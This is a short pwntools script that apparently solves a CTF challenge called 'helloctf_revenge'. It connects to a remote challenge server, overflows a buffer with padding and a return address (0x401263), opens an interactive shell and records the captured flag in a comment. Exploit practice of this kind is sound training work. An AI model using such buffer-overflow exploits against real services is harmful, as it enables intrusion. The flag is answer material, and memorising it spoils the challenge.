#!python3
from pwn import *

r = remote("ctf.adl.tw", 10001)
# r = process("./helloctf_revenge")

r.recvuntil("Do you like VTuber?")
r.sendline(flat("yes\0" + "s" * 20, p64(0x401263)))

r.interactive()

# ADL{wh@T_hAppEned_why_y0u_Can_f!Nd_Th5_F1@9_tHrOU9h_!n7eRnA1_c0D3}
